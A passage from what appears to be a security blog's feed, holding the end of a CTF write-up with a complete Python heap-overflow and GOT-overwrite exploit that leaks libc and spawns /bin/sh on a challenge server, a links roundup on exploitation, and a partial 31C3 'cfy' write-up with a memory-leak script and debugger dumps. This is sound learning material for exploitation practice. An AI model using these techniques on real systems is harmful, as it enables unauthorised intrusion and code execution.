</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;54.163.248.69&#39;</span><span class="p">,</span> <span class="mi">9005</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="c"># receive banner</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># ask the binary to store three notes</span>
</span><span class='line'><span class="c"># we&#39;ll overflow a into b later on</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;store&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;a&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;4&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;AAAA&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;store&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;b&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;4&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;BBBB&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># the third note will hold our format string</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;store&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;c&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">format_str</span> <span class="o">=</span> <span class="s">&quot;--%3$x&quot;</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">format_str</span><span class="p">)))</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">format_str</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># edit a with a large value</span>
</span><span class='line'><span class="c"># this overflows and overwrites the note_info struct of b</span>
</span><span class='line'><span class="c"># the pointer to the data is overwriting with free@got</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] overflowing a to set b to free@got&quot;</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;edit&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;a&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;40&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">12</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x29\x00\x00\x00\x62\x00\x00\x00</span><span class="s">&quot;</span><span class="o">+</span><span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">12</span><span class="o">+</span><span class="n">p</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">p</span><span class="p">(</span><span class="mh">0x804b020</span><span class="p">))</span>
</span><span class='line'><span class="c">#       ^ overflow    ^ restore 0x29, &#39;b&#39;               ^ size of b ^ free@got</span>
</span><span class='line'>
</span><span class='line'><span class="c"># overwrite free@got with printf</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] replacing free() with printf()&quot;</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;edit&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;b&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;4&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x080485f0</span><span class="p">))</span>  <span class="c"># free@got overwritten with printf</span>
</span><span class='line'>
</span><span class='line'><span class="c"># now &#39;get&#39; c and trigger the format string vulnerability</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] triggering format string&quot;</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;get&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;c&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">data</span> <span class="o">=</span> <span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">format_str</span><span class="p">)))</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># this proved to be a bit finicky:</span>
</span><span class='line'><span class="n">data</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
</span><span class='line'><span class="n">data</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">data</span>
</span><span class='line'><span class="c"># grab leaked libc address</span>
</span><span class='line'><span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">r&#39;x--(.*)cSel&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span><span class='line'><span class="k">if</span> <span class="n">m</span><span class="p">:</span>
</span><span class='line'>  <span class="k">print</span> <span class="n">m</span>
</span><span class='line'>  <span class="n">leak</span> <span class="o">=</span> <span class="s">&quot;0x&quot;</span><span class="o">+</span><span class="n">m</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>  <span class="n">leak_hex</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leak</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] found first addr: {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak_hex</span><span class="p">))</span>
</span><span class='line'>  <span class="n">system</span> <span class="o">=</span> <span class="n">leak_hex</span> <span class="o">-</span> <span class="mi">155428</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] system @ {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="c"># repeat the same trick, but this time, overwrite free@got with system()</span>
</span><span class='line'><span class="c"># first note contains /bin/sh, used as argument for system()</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;store&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;sh&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;7&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;/bin/sh&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;store&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;t&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;4&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;TTTT&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;store&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;q&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;4&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;QQQQ&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] overflowing t to set q to free@got&quot;</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;edit&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;t&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;40&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">12</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x29\x00\x00\x00\x71\x00\x00\x00</span><span class="s">&quot;</span><span class="o">+</span><span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">12</span><span class="o">+</span><span class="n">p</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">p</span><span class="p">(</span><span class="mh">0x804b020</span><span class="p">))</span>
</span><span class='line'><span class="c">#     ^ overflow              ^ restore &#39;q&#39;           ^ size of q  ^ free@got</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] replacing free() with system()&quot;</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;edit&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;q&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;4&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">p</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>     <span class="c"># free@got overwritten with system</span>
</span><span class='line'>
</span><span class='line'><span class="c"># trigger system(&#39;/bin/sh&#39;)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;get&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;sh&#39;</span><span class="p">)</span>  <span class="c"># this note contains &#39;/bin/sh&#39; and those contents are passed to system()</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;7&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># shell spawned, interact with it!</span>
</span><span class='line'><span class="n">t</span><span class="o">=</span><span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">sock</span><span class="o">=</span><span class="n">s</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>I ran it, and to my surprise, I got it right the first time! I dropped into a shell on the remote box:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@ubuntu-VirtualBox:/home/ubuntu/nullcon/mixme# python exploit.py
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> overflowing a to <span class="nb">set </span>b to free@got
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> replacing free<span class="o">()</span> with <span class="nb">printf</span><span class="o">()</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> triggering format string
</span><span class='line'>Name: Size: --%3<span class="nv">$x</span>--b768d024cSelect op <span class="o">(</span>store/get/edit/exit<span class="o">)</span>:
</span><span class='line'><span class="o">[</span><span class="s1">&#39;b768d024&#39;</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> found first addr: 0xb768d024L
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> system @ 0xb7667100L
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> overflowing t to <span class="nb">set </span>q to free@got
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> replacing free<span class="o">()</span> with system<span class="o">()</span>
</span><span class='line'>/bin/sh
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span><span class="m">1005</span> <span class="nv">gid</span><span class="o">=</span><span class="m">1005</span> <span class="nv">groups</span><span class="o">=</span>0
</span><span class='line'>cat flag.txt
</span><span class='line'>aw3s0m3++_hipp1e_pwn_r0ckst4r
</span></code></pre></td></tr></table></div></figure>


<p>The flag was <code>aw3s0m3++_hipp1e_pwn_r0ckst4r</code>. This one was really though and I&rsquo;m glad I managed to beat it with just 20 minutes left for the ctf!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Weekly Roundup 2015 #1]]></title>
    <link href="http://barrebas.github.io/blog/2015/01/03/weekly-roundup-2015-number-1/"/>
    <updated>2015-01-03T08:54:42+01:00</updated>
    <id>http://barrebas.github.io/blog/2015/01/03/weekly-roundup-2015-number-1</id>
    <content type="html"><![CDATA[<p>Time for another weekly round-up of interesting links!</p>

<!-- more -->


<p>I&rsquo;ll kick this one off with a very interesting blog about <a href="http://v0ids3curity.blogspot.in/2014/12/return-to-vdso-using-elf-auxiliary.html">bypassing ASLR on 64 bit systems using ELF auxilliary vectors</a> by Reno Robert. This technique leaks the address of the VDSO (Virtual Dynamic Shared Object). The VDSO can then be used as a source for ROP gadgets. The entire process of writing a functioning exploit is described in great detail, with a proof-of-concept in <code>python</code>. Furthermore, the author notes that the address of VDSO is not very random, making bruteforcing an option even on 64 bit systems. Very nice read, very detailed!</p>

<p>I&rsquo;d like to follow up this exploitation goodness with a link to Google&rsquo;s Project Zero blog: <a href="http://googleprojectzero.blogspot.nl/2015/01/finding-and-exploiting-ntpd.html">Finding and exploiting ntpd vulnerabilities</a> by Stephen Röttger. This is a really in-depth story about fuzzing the NTPD daemon, coming up with something that barely looks like a vulnerability and through pure persistence, turning it into a full exploit. Amazing stuff!</p>

<p>If you like wargames, this one is sure to get your blood pumping: <a href="https://overthewire.org/wargames/drifter/">Drifter over at Overthewire</a> is online! It&rsquo;s a wargame along the lines of <a href="http://overthewire.org/wargames/vortex/">Vortex</a>, which I&rsquo;ve started playing this week. If you want to learn about binary exploitation, <a href="https://overthewire.org/">overthewire</a> is <strong>the</strong> place to start!</p>

<p>The folks over at rapid7 have now officially said <a href="https://community.rapid7.com/community/metasploit/blog/2014/12/08/good-bye-msfpayload-and-msfencode">farewell to msfpayload &amp; msfencode</a>. These awesome tools are being superseded by <code>msfvenom</code>. This blog post gives a basic rundown of the new tool and five good examples of it&rsquo;s usage. Further documentation about <code>msfvenom</code> can be found on <a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom">rapid7&rsquo;s github</a>.</p>

<p>Some things to look forward to in the land of VulnHub VMs: <a href="https://r3v3rs3r.wordpress.com">c0ne</a> is currently making a VM focused on binary exploitation. I can say from first hand that these binaries are really fun to exploit! Furthermore, strata&rsquo;s VM is being beta-tested and is due soon.</p>

<p>Finally, <a href="http://blog.vulnhub.com/2014/01/vulnhub-turns-0x01.html">VulnHub&rsquo;s birthday</a> is coming up. A little mouse told me there might just be a new competition coming&hellip;</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[31C3 CTF - Cfy]]></title>
    <link href="http://barrebas.github.io/blog/2014/12/29/31c3-ctf-cfy/"/>
    <updated>2014-12-29T12:06:07+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/12/29/31c3-ctf-cfy</id>
    <content type="html"><![CDATA[<p>Man, 31C3 CTF was tough. I managed to get this flag, worth 10 points. Seems I need to keep learning ;] Let&rsquo;s have a look at <code>cfy</code>.</p>

<!-- more -->


<p></p>

<p>We&rsquo;re given the binary and a place to connect to. Upon connecting with <code>nc</code>, we see the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/31c3<span class="nv">$ </span>nc 188.40.18.73 3313
</span><span class='line'>What <span class="k">do</span> you want to <span class="k">do</span>?
</span><span class='line'>0<span class="o">)</span> parse from hex
</span><span class='line'>1<span class="o">)</span> parse from dec
</span><span class='line'>2<span class="o">)</span> parse from pointer
</span><span class='line'>3<span class="o">)</span> quit
</span></code></pre></td></tr></table></div></figure>


<p>With option 2, we have an arbitrary read ability, but we have to pass in the pointer in raw hex. This allows us to leak a <code>libc</code> address from the GOT. I chose to leak <code>printf</code> because I figured that one would have been resolved by the time our input was handled.</p>

<p>Finding the address of <code>printf</code> pointer in GOT was done like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/31c3/cfy<span class="nv">$ </span>objdump -d -M intel ./cfy <span class="p">|</span>grep <span class="s2">&quot;printf&quot;</span> -A2
</span><span class='line'>00000000004005e0 &lt;<span class="nb">printf</span>@plt&gt;:
</span><span class='line'>  4005e0: ff <span class="m">25</span> 3a 0a <span class="m">20</span> <span class="m">00</span>      jmp    QWORD PTR <span class="o">[</span>rip+0x200a3a<span class="o">]</span>        <span class="c"># 601020 &lt;_GLOBAL_OFFSET_TABLE_+0x20&gt;</span>
</span><span class='line'>  4005e6: <span class="m">68</span> <span class="m">01</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>           push   0x1
</span></code></pre></td></tr></table></div></figure>


<p>So the pointer to <code>printf</code> is located at <code>0x601020</code> in the binary. This script grabs that value via the &ldquo;parse from pointer&rdquo; option:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">time</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;188.40.18.73&#39;</span><span class="p">,</span> <span class="mi">3313</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;L&quot;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">addr</span> <span class="o">=</span> <span class="mh">0x601020</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;2</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>  <span class="c"># printf</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Which gives us the output:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/31c3/cfy<span class="nv">$ </span>python read.py
</span><span class='line'>What <span class="k">do</span> you want to <span class="k">do</span>?
</span><span class='line'>0<span class="o">)</span> parse from hex
</span><span class='line'>1<span class="o">)</span> parse from dec
</span><span class='line'>2<span class="o">)</span> parse from pointer
</span><span class='line'>3<span class="o">)</span> quit
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Please enter your number: dec: 140512731112416
</span><span class='line'>hex: 0x7fcbab6ca3e0
</span><span class='line'>
</span><span class='line'>What <span class="k">do</span> you want to <span class="k">do</span>?
</span><span class='line'>0<span class="o">)</span> parse from hex
</span><span class='line'>1<span class="o">)</span> parse from dec
</span><span class='line'>2<span class="o">)</span> parse from pointer
</span><span class='line'>3<span class="o">)</span> quit
</span></code></pre></td></tr></table></div></figure>


<p>Unfortunately, running the python script again shows a different address for <code>printf</code>. This means that ASLR is enabled. Furthermore, I didn&rsquo;t know what version of <code>libc</code> was running!</p>

<p>I turned my attention to gaining code execution. This was more trivial, although it wasn&rsquo;t a straight-forward buffer overflow. The binary asks the user for a choice. That choice is converted from a string to an int. From this int, the binary looks up the relevant code to handle the request:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>  4008af: <span class="m">48</span> c1 e0 <span class="m">04</span>           shl    rax,0x4         <span class="p">;</span> multiply value by 16
</span><span class='line'>  4008b3: <span class="m">48</span> <span class="m">05</span> <span class="m">80</span> <span class="m">10</span> <span class="m">60</span> <span class="m">00</span>     add    rax,0x601080    <span class="p">;</span> address of parsers, see below
</span><span class='line'>  4008b9: <span class="m">48</span> 8b <span class="m">00</span>              mov    rax,QWORD PTR <span class="o">[</span>rax<span class="o">]</span>
</span><span class='line'>  4008bc: bf e0 <span class="m">10</span> <span class="m">60</span> <span class="m">00</span>        mov    edi,0x6010e0    <span class="p">;</span> address of buf, see below
</span><span class='line'>  4008c1: ff d0                 call   rax             <span class="p">;</span> gain code <span class="nb">exec </span>here!
</span></code></pre></td></tr></table></div></figure>


<p>There is no check performed on the value in <code>rax</code>. If we pass in a normal value, like <code>2</code>, the binary fetches the corresponding parser here:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>p parsers
</span><span class='line'><span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span> <span class="o">{</span>
</span><span class='line'>    <span class="nv">fn</span> <span class="o">=</span> 0x40073d &lt;from_hex&gt;,
</span><span class='line'>    <span class="nv">desc</span> <span class="o">=</span> 0x4009b4 <span class="s2">&quot;parse from hex&quot;</span>
</span><span class='line'>  <span class="o">}</span>, <span class="o">{</span>
</span><span class='line'>    <span class="nv">fn</span> <span class="o">=</span> 0x400761 &lt;from_dec&gt;,
</span><span class='line'>    <span class="nv">desc</span> <span class="o">=</span> 0x4009c3 <span class="s2">&quot;parse from dec&quot;</span>
</span><span class='line'>  <span class="o">}</span>, <span class="o">{</span>
</span><span class='line'>    <span class="nv">fn</span> <span class="o">=</span> 0x400785 &lt;from_ptr&gt;,
</span><span class='line'>    <span class="nv">desc</span> <span class="o">=</span> 0x4009d2 <span class="s2">&quot;parse from pointer&quot;</span>
</span><span class='line'>  <span class="o">}</span> <span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>But look here: <code>buf</code> is almost right behind <code>parsers</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>x/40wx parsers
</span><span class='line'>0x601080 &lt;parsers&gt;:             0x0040073d  0x00000000  0x004009b4  0x00000000
</span><span class='line'>0x601090 &lt;parsers+16&gt;:          0x00400761  0x00000000  0x004009c3  0x00000000
</span><span class='line'>0x6010a0 &lt;parsers+32&gt;:          0x00400785  0x00000000  0x004009d2  0x00000000
</span><span class='line'>0x6010b0:                       0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x6010c0 &lt;stdout@@GLIBC_2.2.5&gt;: 0xf7dd77a0  0x00007fff  0xf7dd76c0  0x00007fff
</span><span class='line'>0x6010d0 &lt;completed.6972&gt;:      0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x6010e0 &lt;buf&gt;:                 0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x6010f0 &lt;buf+16&gt;:              0x00000000  0x00000000  0x00000000  0x00000000
